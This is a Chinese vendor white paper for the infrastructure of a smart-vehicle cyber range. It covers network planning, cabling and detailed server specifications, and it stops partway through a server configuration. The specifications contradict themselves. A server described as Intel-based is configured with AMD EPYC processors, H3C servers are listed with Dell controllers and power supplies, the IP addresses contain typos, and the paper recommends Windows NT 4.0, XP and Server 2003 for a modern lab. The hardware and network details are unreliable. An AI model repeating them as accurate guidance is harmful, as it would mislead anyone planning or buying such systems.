<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="posts/0/"/>
      <url>posts/0/</url>
      
        <content type="html"><![CDATA[<p><strong>国利网安智能汽车网络靶场基础设施</strong></p><p><strong>技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7fff6fc96b751b4ab487f682d0a3a2c2.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1.1 总体概述 1</p><p>1.1.1 系统概述 1</p><p>1.2 文档交付 2</p><p>2 智能汽车网络靶场网络资源设备 2</p><p>2.1 总体概述 2</p><p>2.2 网络规划方案 3</p><p>2.2.1 方案 3</p><p>2.3 网络布线 6</p><p>2.3.1 方案 6</p><p>2.4 服务器方案 7</p><p>2.4.1 应用服务器 7</p><p>2.4.2 业务服务器 15</p><p>2.4.3 运营存储服务器 21</p><p>2.4.4 靶场存储服务器 25</p><p>2.4.5 测试工具服务器 29</p><p>2.4.6 虚拟计算服务器（X86） 33</p><p>2.4.7 虚拟计算服务器（ARM） 36</p><p>2.5 机房设备参数 39</p><p>2.5.1 KVM参数 39</p><p>2.6 网络设备参数 41</p><p>2.6.1 汇聚交换机 41</p><p>2.6.2 接入交换机 44</p><p>2.6.3 POE交换机 46</p><p>2.6.4 万兆交换机 48</p><p>2.6.5 千兆交换机 49</p><p>2.7 网络安全防护 50</p><p>2.7.1 总体思路 50</p><p>2.7.2 设计原则 51</p><p>2.7.3 安全建设要求 52</p><p>2.7.4 安全架构设计 52</p><p>2.7.5 安全通信网络 54</p><p>2.7.6 安全区域边界 56</p><p>2.7.7 计算环境能力 61</p><p>2.7.8 安全产品防护能力 62</p><p>2.8 其他资产设备 71</p><p>2.8.1 工作站 71</p><p>2.8.2 显示器 73</p><p>2.8.3 移动终端 74</p><p>3 智能驾驶网络靶场沙盘 79</p><p>3.1 总体概述 79</p><p>3.2 智能驾驶网络安全沙盘 85</p><p>3.2.1 沙盘技术方案 85</p><p>3.2.2 小车性能参数技术方案 89</p><p>3.2.3 智能驾驶网络安全场景 94</p><p>4 网络靶场动态仿真系统 99</p><p>4.1 总体概述 99</p><p>4.2 需求分析 100</p><p>4.3 功能介绍 101</p><p>4.4 产品功能参数： 102</p><p>4.4.1 驾驶舱 102</p><p>4.4.2 运动平台 104</p><p>4.4.3 车辆动力学模型 106</p><p>4.4.4 影像系统 107</p><p>4.4.5 道路交通场景仿真软件 109</p><p>4.4.6 自动驾驶攻防演示场景 111</p><p>5 智能汽车网络靶场攻防演练大屏系统 113</p><p>5.1 总体概述 113</p><p>5.1.1 全彩LED显示屏 114</p><p>5.1.2 LED发送盒 133</p><p>5.1.3 控制电脑 134</p><p>5.1.4 管理软件 135</p><p>5.1.5 视频拼接器参数要求 136</p><p>5.1.6 机柜参数要求 138</p><p>5.1.7 配电柜参数要求 139</p><p>5.1.8 钢架结构参数要求 140</p><p>5.1.9 线阵列音柱参数要求 140</p><p>5.1.10 多功能商用功率放大器参数要求 141</p><p>5.1.11 配套辅材参数要求 145</p><p>6 智能汽车网络靶场攻防演练车辆台架 145</p><p>6.1 总体概述 145</p><p>6.2 实车台架方案 145</p><p>6.2.1 方案 146</p><p>6.3 电子电器零部件方案 148</p><p>6.3.1 方案 149</p><p>6.4 车端软件方案 152</p><p>6.4.1 方案 154</p><p>6.5 仿真云平台方案 155</p><p>6.5.1 方案 156</p><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>靶场基础设施包含了智能汽车网络靶场整体展示系统、网络资源设备、攻防演练大屏、攻防演练车辆台架、智能驾驶网络安全沙盘以及智能驾驶网络安全动态仿真系统。为靶场提供整体设计、装修施工、设备安装、网络规划，是靶场建设的基础。</p><h3 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h3><p>展示系统提供靶场整体设计、深化设计、施工要求、环保要求等，为靶场提供全方位的设计工作。</p><p>网络资源设备为汽车网络靶场运行提供计算性能、存储空间、网络连接和安全防护。</p><p>攻防演练大屏为汽车网络靶场运行提供高清、实时、直观的仿真验证、测试、竞赛、演练及安全运营可视化基础设施。</p><p>攻防演练车辆台架提供直观逼真的整车信息安全攻防演练及测试结果演示。</p><p>智能驾驶网络安全沙盘以及智能驾驶网络安全动态仿真系统为靶场实时逼真的智能驾驶安全研究模型与展示平台。</p><p>智能汽车网络靶场基础设施建设框架如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7a590f8f259b4c07ace6c7bc96fdbde1.png" alt="图片包含 应用程序 描述已自动生成"></p><h2 id="文档交付"><a href="#文档交付" class="headerlink" title="文档交付"></a>文档交付</h2><p>基础设施部分交付等于以下文档：</p><table><thead><tr><th>序号</th><th>所属系统</th><th>文档名称</th><th>数量</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>基础设施</td><td>试验室日常管理办法</td><td>1套</td><td>文档</td></tr><tr><td>2</td><td></td><td>试验室电路布置</td><td>1套</td><td>文档</td></tr><tr><td>3</td><td></td><td>试验室网络布置和使用手册</td><td>1套</td><td>文档</td></tr><tr><td>4</td><td></td><td>攻防演练大屏使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>5</td><td></td><td>攻防演练车辆台架使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>6</td><td></td><td>智能驾驶网络安全沙盘使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>7</td><td></td><td>智能驾驶网络安全动态仿真系统使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>8</td><td></td><td>试验室设计效果图</td><td>1套</td><td>文档</td></tr><tr><td>9</td><td></td><td>试验室施工图</td><td>1套</td><td>文档</td></tr><tr><td>10</td><td></td><td>消防规划图</td><td>1套</td><td>文档</td></tr></tbody></table><h1 id="智能汽车网络靶场网络资源设备"><a href="#智能汽车网络靶场网络资源设备" class="headerlink" title="智能汽车网络靶场网络资源设备"></a>智能汽车网络靶场网络资源设备</h1><h2 id="总体概述-1"><a href="#总体概述-1" class="headerlink" title="总体概述"></a>总体概述</h2><p>智能汽车网络靶场网络资源设备具备以下能力：为汽车网络靶场运行提供计算性能、存储空间、网络连接和安全防护。其中虚拟计算服务器（X86）为靶场提供通用的虚拟节点和虚拟网络运行环境，存储靶场的知识、试验等数据库，为靶场提供人员管理和资源管理。虚拟计算服务器（ARM）为车端场景或Android系统仿真提供计算能力。5G综合网管服务器为实验室及外场动态测试5G专网提供管理软件载体。测试工具服务器为系统安全、代码安全测试工具提供安装运行载体。万兆交换机为靶场节点提供高性能的数据交换性能。千兆交换机为靶场设备管理、虚实互联提供高性能的数据交换网。靶场防火墙为靶场平台提供边界保护能力。靶场应用防护系统保护靶场管理平面免受SQL注入，跨站脚本漏洞（XSS）等面向应用的攻击。靶场攻击检测设备检测与采集数据流智能分发设备并阻断针对靶场管理平面的网络入侵行为。全流量威胁发现设备参数、应用协议威胁特征检测设备、多层协议异常特征检测设备、漏洞特征采集设备用于支撑靶场进行流量分析和漏洞探测。</p><p>智能汽车网络靶场网络资源设备包含虚拟计算服务器（X86）、虚拟计算服务器（ARM）、应用存储服务器、安全运营服务器、测试工具服务器、万兆交换机、千兆交换机、防火墙、靶场应用防护系统、等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2a205fa485dc757ecfbf01ba42c34142.png" alt="lQLPJw0EPK-fsADNAnzNBbmwfckdSU1fhmMEE3HDxQACAA_1465_636"></p><h2 id="网络规划方案"><a href="#网络规划方案" class="headerlink" title="网络规划方案"></a>网络规划方案</h2><p>功能参数如下：</p><ol><li>我司根据整体的网络构架，提供详尽的网络规划方案，详见“方案响应”部分；</li><li>提供的网络规划布局合理，布局规划合理；</li><li>我司提供了整体的网络布线图和网络规划图，规划范围包含以下内容：</li></ol><ul><li>满足支持SRC平台的网络安全接入要求；</li><li>满足靶场对外众测网络使用及安全保证；</li><li>满足靶场攻防演练场景下的对战网络需求；</li><li>满足人员办公需求；</li><li>满足不同系统之间的调用和通信；</li><li>满足网络内设备、系统、人员的正常使用；</li></ul><ol><li>我司提供方案应经过客户审核其合理性和可行性。</li></ol><h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><ol><li>用户需求分析</li></ol><p>为满足XXXX智能汽车网络靶场实验室网络需求，需要根据靶场建设内容进行网络规划，靶场用网需求包含机房各服务器、交换机设备、防火墙设备、靶场测试工具、靶场堡垒机、展示区沙盘、智能驾驶座舱、工作站、靶场大屏、办公网络等，另外除了内部网络需求之外，还需要考虑与外部网络之间的通路和映射关系，外网需求包含SRC平台开展的众测活动、基于靶场攻防演练的对战网络、以及与鹏城实验室的靶场互联网络；</p><ol><li>网络拓扑设计</li></ol><p>局域网采用星型网络拓朴结构，星型拓朴结构为现在较为流行的一种网络结构，它是以一台中心处理机（通信设备）为主而构成的网络，其它入网机器仅与该中心处理机之间有直接的物理链路，中心处理机采用分时或轮询的方法为入网机器服务，所有的数据必须经过中心处理机。由于所有节点的往外传输都必须经过中央节点来处理，因此，对中央节点的要求比较高。</p><p>优点是网络结构简单，易于维护，便于管理（集中式）；每台入网机均需物理线路与处理机互连，线路利用率低；处理机负载重（需处理所有的服务），因为任何两台入网机之间交换信息，都必须通过中心处理机；入网主机故障不影响整个网络的正常工作。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/75ba2853d7aaa83831ebfb909c66e054.png"></p><p>网络规划图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/58422d9f02037f7ce65e59525e8bb0a5.png" alt="1703488289637"></p><p>网络布线图</p><ol><li>网络规划设计</li></ol><p>1）、采用IP地址规划，用子网掩码区别各工作区。</p><p>一共3个工作区，采用C类地址，需要8个网段，划分如下：</p><table><thead><tr><th>工作部门</th><th>所属网段</th><th>IP地址</th></tr></thead><tbody><tr><td>机房区</td><td>202.10.10.32-63(vlan1)</td><td>202.10.10.34</td></tr><tr><td>办公区</td><td>202.10.10.64-95(vlan2)</td><td>202.10.10.66—202.110.10.67</td></tr><tr><td>靶场区</td><td>202.10.10.96-127(vlan3)</td><td>202.10.10.98—202.110.10.101</td></tr></tbody></table><p>2）、将机房区、办公区、靶场去划分为VLAN，用路由器做VLAN之间的路由。交换机有24个端口，按照3个人分区的设备类型进行划分。</p><p>3）、用路由器定义访问控制列表来实现访问权限</p><ol><li>操作系统的选择</li></ol><p>网络操作系统的选择：以Microsoft Windows NT Server 4.0为主，它是发展速度最快的集成了Web应用的网络操作系统。具有界面友好、系统强壮、稳定可靠、与桌面主流操作系统相容性好等优点。并拥有大量的基于NT的服务器端软件，是Intranet网络中最佳的网络操作系统平台。</p><p>WindowsNT具有如下一些特点:服务器端的多硬件平台支持;文件及打印共享;适合于分布应用:用NT编写的分布式应用程序可以跨接到其它系统;内置良好的安全措施与先进的容错能力;内置的Internet/Intranet功能,及使用方案;开放式网络服务接口,用户可访问多个计算机环境的信息,获得更为广泛的服务。</p><p>PC操作系统：WINDOWS XP,或者WINDOWS 2000 PRO优点普及率高，图文界面，操作简单，配置方便，支持多种网络协议，相应的配套软件丰富。而且部分商用机随即发售，节约成本。</p><p>服务器操作系统：Windows Server 2003 Enterprise Edition图文界面，操作简单，配置方便，支持多种网络协议。</p><ol><li>接入方式设计</li></ol><p>除了与鹏城实验室的互联网专线外，均采用XXXX园区本地网络，互联网专线采用500M。</p><h2 id="网络布线"><a href="#网络布线" class="headerlink" title="网络布线"></a>网络布线</h2><p>功能参数如下：</p><ol><li>我司提供整体的网络布线方案，详见“响应方案”；</li><li>方案的整体布线合理、清晰；</li><li>采用超五类非屏蔽双绞线；</li><li>符合强弱电铺设国标规范要求；</li><li>对不同网络节点的链接方式进行标注。</li></ol><h3 id="方案-1"><a href="#方案-1" class="headerlink" title="方案"></a>方案</h3><p>本次XXXX汽车网络靶场建设网络布线包含强弱电设计，均考虑从机房下电下网，走线方式采用地埋式走线；</p><p>强电设计：从机房配电箱出线，将线引至各用电设备处后再连接地插出电，空开按照分区设计；</p><p>弱电设计：从机房核心交换机处通过网线连接办公区和靶场区的汇聚交换机，再由汇聚交换机连接到各用网设备；</p><p>设计图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/58422d9f02037f7ce65e59525e8bb0a5.png" alt="1703488355071"></p><h2 id="服务器方案"><a href="#服务器方案" class="headerlink" title="服务器方案"></a>服务器方案</h2><p>我司选用国内IDC排名前三的华三服务器，服务器采用机架式，并提供安装辅材及套件。</p><p>1.</p><p>2.</p><p>3.</p><p>4.</p><h3 id="应用服务器"><a href="#应用服务器" class="headerlink" title="应用服务器"></a>应用服务器</h3><p>我司提供4台H3C 的2U机架式UniServer R4950 G5 应用服务器，该服务器具备以下指标参数信息：</p><ol><li>处理器：64核</li><li>满足内存256G DDR4</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4bd3747f0f89bb4f8de0864fa1a7249c.png"></p><ol><li>16个内存插槽. 每个处理器支持8个内存通道, 每个通道最大支持1个内存插槽.</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9be5d2d0efee35310b7a3c972ecb5b83.png"></p><ol><li>满足内存最大速度可达 3200MT/s.支持RDIMM与BPS/NVDIMM内存.</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/38d5ce7e17fa880e5717dcc16a0d844a.png"></p><ol><li>满足硬盘16TB SATA2</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6675be7f5e4a5ca1f0843ed923a49c73.png"></p><ol><li>满足硬盘512G SSD</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/14421e92995eea2adf4377e39da851cd.png"></p><ol><li>具备最大支持24个2.5英寸/3.5英寸SAS/SATA硬盘支持热插拔</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/aee5c20c5163cc7da527fbcbe44a94c6.png"></p><ol><li>可选支持2个 M.2 SSD或2个 E1.S SSD存储模块</li><li>要求电源使用交流冗余电源</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3b68082017b2e00c9201b9d47e0c69ae.png"></p><ol><li>具备千兆网卡4电口及其一块万兆网卡</li><li>支持扩展插槽 4 个PCI-E 插槽或2 个PCI-X 和2 个PCI-E插槽</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0c1895fbf85b4d866bae6888430cf149.png"></p><ol><li>2个后置USB3.0+1个后置VGA+1个COM口</li><li>满足存储控制器RAID1 或1+0，带读写高速缓存128M</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/978ea2dc9eeb97a428b03aee9994d452.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b0af2296cba3de862c3f39d0bf36cccd.png"></p><h4 id="应用服务器配置方案"><a href="#应用服务器配置方案" class="headerlink" title="应用服务器配置方案"></a>应用服务器配置方案</h4><ol><li>处理器</li></ol><p>型号：2x AMD EPYC 7763 32-Core Processor</p><p>核心：共64核心，支持128线程</p><ol><li>内存</li></ol><p>容量与型号：16x 16GB Samsung DDR4-3200 RDIMM PC4-25600R</p><p>插槽数量：16个（每个处理器对应8个插槽）</p><p>速度：3200MT/s</p><p>类型：支持RDIMM和BPS/NVDIMM内存模块</p><ol><li>硬盘</li></ol><p>16TB SATA HDD：Seagate Exos X16 16TB Enterprise HDD</p><p>512GB SSD：Samsung 970 PRO 512GB NVMe M.2</p><ol><li>硬盘扩展</li></ol><p>硬盘槽：支持24个2.5英寸/3.5英寸SAS/SATA硬盘槽，支持热插拔</p><p>M.2 SSD选项：Samsung 970 EVO Plus NVMe M.2</p><p>E1.S SSD选项：Intel Optane SSD DC P4801X Series</p><ol><li>存储控制器</li></ol><p>型号：Dell PERC H730P RAID Controller</p><p>支持RAID 1或1+0</p><p>缓存：1GB NV Cache</p><ol><li>网络</li></ol><p>千兆网卡：4x Intel I350 Quad-Port Gigabit Network Daughter Card</p><p>万兆网卡：1x Mellanox ConnectX-4 Lx 10GbE SFP+</p><ol><li>扩展插槽</li></ol><p>4x PCI-E 4.0 x16插槽</p><ol><li>USB端口</li></ol><p>后置USB 3.0端口：2x USB 3.0 Type-A</p><ol><li>视频输出</li></ol><p>后置VGA端口：1x VGA port (integrated ASPEED AST2500)</p><ol><li>串行端口</li></ol><p>COM口：1x RS-232</p><ol><li>存储卡</li></ol><p>TF卡：2x Transcend 4GB Industrial MicroSDHC UHS-I</p><ol><li>电源</li></ol><p>型号：2x Dell 750W Hot-Plug Power Supply Unit</p><ol><li>工作温度</li></ol><p>0℃ ~ 40℃</p><ol><li>服务器管理</li></ol><p>远程管理模块：H3C iMC (Intelligent Management Center)</p><ol><li>服务器机箱</li></ol><p>华三与所供处理器品牌的兼容性。</p><ol><li>散热系统</li></ol><p>风扇：标准机箱配备的多风扇模块</p><ol><li>硬件兼容性</li></ol><p>所有组件均应选择经过验证的兼容品牌。</p><ol><li>软件支持</li></ol><p>服务器应兼容主流操作系统，如Windows Server 2019、Red Hat Enterprise Linux 8等。</p><h3 id="业务服务器"><a href="#业务服务器" class="headerlink" title="业务服务器"></a>业务服务器</h3><p>我司提供4台H3C 的2U机架式UniServer R4950 G5 业务服务器，该服务器具备以下指标参数信息：</p><ol><li>处理器32核</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5f1fe988a2813d5978f739e5ce036c63.png"></p><ol><li>满足内存512G DDR4</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5f1fe988a2813d5978f739e5ce036c63.png"></p><ol><li>等于16个内存插槽. 每个处理器支持8个内存通道, 每个通道最大支持1个内存插槽.</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c1c0ec8686ddc12e05e9ac09286ae6a5.png"></p><ol><li>满足内存最大速度可达 3200MT/s.支持RDIMM与BPS/NVDIMM内存.</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a9818e6e0495e142ff6784f805e6d643.png"></p><ol><li>满足硬盘16TB SATA2</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d11843a5e1d3d2f9320927d726843d11.png"></p><ol><li>满足硬盘512G SSD</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d11843a5e1d3d2f9320927d726843d11.png"></p><ol><li>具备最大支持24个2.5英寸/3.5英寸SAS/SATA硬盘支持热插拔</li><li>可选支持2个 M.2 SSD或2个 E1.S SSD存储模块</li><li>要求电源使用交流冗余电源</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d11843a5e1d3d2f9320927d726843d11.png"></p><ol><li>具备千兆网卡4电口及其一块万兆网卡</li><li>支持扩展插槽 4 个PCI-E 插槽或2 个PCI-X 和2 个PCI-E插槽</li><li>等于2个后置USB3.0+1个后置VGA+1个COM口</li><li>满足存储控制器RAID1 或1+0，带读写高速缓存128M</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d11843a5e1d3d2f9320927d726843d11.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4cb33479ddbf6bd5a0d1e64aa0d327a2.png"></p><h4 id="业务服务器配置方案"><a href="#业务服务器配置方案" class="headerlink" title="业务服务器配置方案"></a>业务服务器配置方案</h4><ol><li>处理器</li></ol><p>型号：2x AMD EPYC 7763 32-Core Processor</p><p>核心：共64核心，支持128线程</p><ol><li>内存</li></ol><p>容量与型号：16x 16GB Samsung DDR4-3200 RDIMM PC4-25600R</p><p>插槽数量：16个（每个处理器对应8个插槽）</p><p>速度：3200MT/s</p><p>类型：支持RDIMM和BPS/NVDIMM内存模块</p><ol><li>硬盘</li></ol><p>16TB SATA HDD：Seagate Exos X16 16TB Enterprise HDD</p><p>512GB SSD：Samsung 970 PRO 512GB NVMe M.2</p><ol><li>硬盘扩展</li></ol><p>硬盘槽：支持24个2.5英寸/3.5英寸SAS/SATA硬盘槽，支持热插拔</p><p>M.2 SSD选项：Samsung 970 EVO Plus NVMe M.2</p><p>E1.S SSD选项：Intel Optane SSD DC P4801X Series</p><ol><li>存储控制器</li></ol><p>型号：Dell PERC H730P RAID Controller</p><p>支持RAID 1或1+0</p><p>缓存：1GB NV Cache</p><ol><li>网络</li></ol><p>千兆网卡：4x Intel I350 Quad-Port Gigabit Network Daughter Card</p><p>万兆网卡：1x Mellanox ConnectX-4 Lx 10GbE SFP+</p><ol><li>扩展插槽</li></ol><p>4x PCI-E 4.0 x16插槽</p><ol><li>USB端口</li></ol><p>后置USB 3.0端口：2x USB 3.0 Type-A</p><ol><li>视频输出</li></ol><p>后置VGA端口：1x VGA port (integrated ASPEED AST2500)</p><ol><li>串行端口</li></ol><p>COM口：1x RS-232</p><ol><li>存储卡</li></ol><p>TF卡：2x Transcend 4GB Industrial MicroSDHC UHS-I</p><ol><li>电源</li></ol><p>型号：2x Dell 750W Hot-Plug Power Supply Unit</p><ol><li>工作温度</li></ol><p>0℃ ~ 40℃</p><ol><li>服务器管理</li></ol><p>远程管理模块：H3C iMC (Intelligent Management Center)</p><ol><li>服务器机箱</li></ol><p>华三与所供处理器品牌的兼容性。</p><ol><li>散热系统</li></ol><p>风扇：标准机箱配备的多风扇模块</p><ol><li>硬件兼容性</li></ol><p>所有组件均应选择经过验证的兼容品牌。</p><ol><li>软件支持</li></ol><p>服务器应兼容主流操作系统，如Windows Server 2019、Red Hat Enterprise Linux 8等。</p><h3 id="运营存储服务器"><a href="#运营存储服务器" class="headerlink" title="运营存储服务器"></a>运营存储服务器</h3><p>运营存储服务器提供4台H3C UniServer R4300 G5是新华三自主研发的全新一代4U两路存储优化型服务器， 基于最新的英特尔®至强®第三代可扩展处理器家族，可实现平均46%的性能提升和43%的内核数量增加；通过高达52块硬盘、最多8张单宽GPU卡，以及傲腾™持久内存和NVMe，在4U空间内满足高存储密度、高效数据计算、线形扩展的综合需求，尤其适合于政府、安平、运营商、互联网、企业等行业的分布式存储、大数据和备份归档应用。</p><p>故我司提供4台H3C 的4U机架式UniServer R4300 G5 运营服务器，该服务器具备以下指标参数信息：</p><ol><li>处理器：32核</li><li>满足内存128G DDR4</li><li>16个内存插槽. 每个处理器支持8个内存通道, 每个通道最大支持1个内存插槽.</li><li>满足内存最大速度可达 3200MT/s.支持RDIMM与BPS/NVDIMM内存.</li><li>满足硬盘200T SATA2</li><li>满足硬盘512G SSD</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/36ab728970944f2ffff8179cfa74c1d4.png"></p><ol><li>具备最大支持24个2.5英寸/3.5英寸SAS/SATA硬盘支持热插拔</li><li>可选支持2个 M.2 SSD或2个 E1.S SSD存储模块</li><li>电源使用交流冗余电源</li><li>具备千兆网卡4电口及其一块万兆网卡</li><li>支持扩展插槽 4 个PCI-E 插槽或2 个PCI-X 和2 个PCI-E插槽</li><li>2个后置USB3.0+1个后置VGA+1个COM口</li><li>满足存储控制器RAID1 或1+0，带读写高速缓存128M</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/73a80a5b44cac189ffb94e7e0f5d506e.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bb446150e29fb14ec6471ee34ba37de3.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/aeb8f0fa53cab245f2451275daf62b01.png"></p><h4 id="运营存储服务器配置方案"><a href="#运营存储服务器配置方案" class="headerlink" title="运营存储服务器配置方案"></a>运营存储服务器配置方案</h4><ol><li>处理器</li></ol><p>型号：2x AMD EPYC 7763 32-Core Processor</p><p>核心：共64核心，支持128线程</p><ol><li>内存</li></ol><p>容量与型号：16x 16GB Samsung DDR4-3200 RDIMM PC4-25600R</p><p>插槽数量：16个（每个处理器对应8个插槽）</p><p>速度：3200MT/s</p><p>类型：支持RDIMM和BPS/NVDIMM内存模块</p><ol><li>硬盘</li></ol><p>16TB SATA HDD：13x Seagate Exos X16 16TB Enterprise HDD</p><p>512GB SSD：Samsung 970 PRO 512GB NVMe M.2</p><ol><li>硬盘扩展</li></ol><p>硬盘槽：支持24个2.5英寸/3.5英寸SAS/SATA硬盘槽，支持热插拔</p><p>M.2 SSD选项：Samsung 970 EVO Plus NVMe M.2</p><p>E1.S SSD选项：Intel Optane SSD DC P4801X Series</p><ol><li>存储控制器</li></ol><p>型号：Dell PERC H730P RAID Controller</p><p>支持RAID 1或1+0</p><p>缓存：1GB NV Cache</p><ol><li>网络</li></ol><p>千兆网卡：4x Intel I350 Quad-Port Gigabit Network Daughter Card</p><p>万兆网卡：1x Mellanox ConnectX-4 Lx 10GbE SFP+</p><ol><li>扩展插槽</li></ol><p>4x PCI-E 4.0 x16插槽</p><ol><li>USB端口</li></ol><p>后置USB 3.0端口：2x USB 3.0 Type-A</p><ol><li>视频输出</li></ol><p>后置VGA端口：1x VGA port (integrated ASPEED AST2500)</p><ol><li>串行端口</li></ol><p>COM口：1x RS-232</p><ol><li>存储卡</li></ol><p>TF卡：2x Transcend 4GB Industrial MicroSDHC UHS-I</p><ol><li>电源</li></ol><p>型号：2x Dell 750W Hot-Plug Power Supply Unit</p><ol><li>工作温度</li></ol><p>0℃ ~ 40℃</p><ol><li>服务器管理</li></ol><p>远程管理模块：H3C iMC (Intelligent Management Center)</p><ol><li>服务器机箱</li></ol><p>华三与所供处理器品牌的兼容性。</p><ol><li>散热系统</li></ol><p>风扇：标准机箱配备的多风扇模块</p><ol><li>硬件兼容性</li></ol><p>所有组件均应选择经过验证的兼容品牌。</p><ol><li>软件支持</li></ol><p>服务器应兼容主流操作系统，如Windows Server 2019、Red Hat Enterprise Linux 8等。</p><h3 id="靶场存储服务器"><a href="#靶场存储服务器" class="headerlink" title="靶场存储服务器"></a>靶场存储服务器</h3><p>靶场存储服务器提供16台全新一代H3C UniServer R4900 G5通过多达32个NVMe SSD1 的支持，以及M.2 SSD形态的引入，进一步增强了面向现代数据中心的扩展能力和配置灵活性。作为一款自主研发的主流2U两路机架式服务器，H3C UniServer R4900 G5基于最新的英特尔®至强®可扩展家族处理器，可实现多达52%的处理器浮点性能提升和42%的核心数量增加，配合8通道3200MT/s DDR4内存技术，为用户提供高达60%的带宽提升。通过多达14个标准PCIe 4.0插槽和多达41个硬盘插槽1的本地存储支持，实现卓越的扩展能力。96%的电源能效，以及5℃-45℃的标准工作温度设计，为用户提供更高的能效回报。</p><p>故我司提供16台H3C 的2U机架式UniServer R4900 G5 靶场存储服务器，该服务器具备以下指标参数信息：</p><ol><li>机器类型：机架式服务器，2U；</li><li>处理器：配置2颗英特尔至强银牌4316处理器，单颗处理器主频2.3GHz, 核数20核；</li><li>内存：配置512GB DDR4内存；</li><li>硬盘：配置2*固态硬盘480GB硬盘8*1800GB 10K rpm的硬盘；</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；</li><li>接口：2*双口10GE光口（含光模块）</li><li>PCIE：最大可扩展14个PCIe 4.0槽位 ；</li><li>配置900W冗余热插拔电源；</li><li>支持深度休眠，系统下电后，进入深度休眠模式的电源会关闭输出；关闭深度休眠或系统上电后，进入深度休眠模式的电源。</li><li>环境温度：长期工作环境温度支持5-45度</li><li>最大支持4个风扇，支持N+1冗余；</li><li>支持 CLI 接口设置弱口令字典认证使能状态和导入，在开启密码检查功能时不允许设置弱口令字典内定义的密码。</li><li>我司提供三年原厂维保。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/25a3111855786fb77083ba76c637b558.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f4bb7c6ab4d7a339726e1b924a00e6c0.png"></p><h4 id="靶场存储服务器配置方案"><a href="#靶场存储服务器配置方案" class="headerlink" title="靶场存储服务器配置方案"></a>靶场存储服务器配置方案</h4><ol><li>处理器</li></ol><p>型号: 2x Intel Xeon Silver 4316</p><p>主频: 2.3GHz</p><p>核数: 每颗20核，共40核</p><ol><li>内存</li></ol><p>容量: 512GB DDR4</p><p>规格: 16x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x H3C 480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>8x H3C 1.8TB 10K RPM SAS HDD</p><p>M.2 SATA SSD:</p><p>支持2x M.2 SATA SSD，支持RAID1，支持热插拔</p><ol><li>RAID卡</li></ol><p>型号: H3C独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>10GE光口:</p><p>2x 双口10GE光口网卡，含光模块</p><p>PCIe扩展</p><p>槽位: 最大可扩展14个PCIe 4.0槽位</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><p>深度休眠支持: 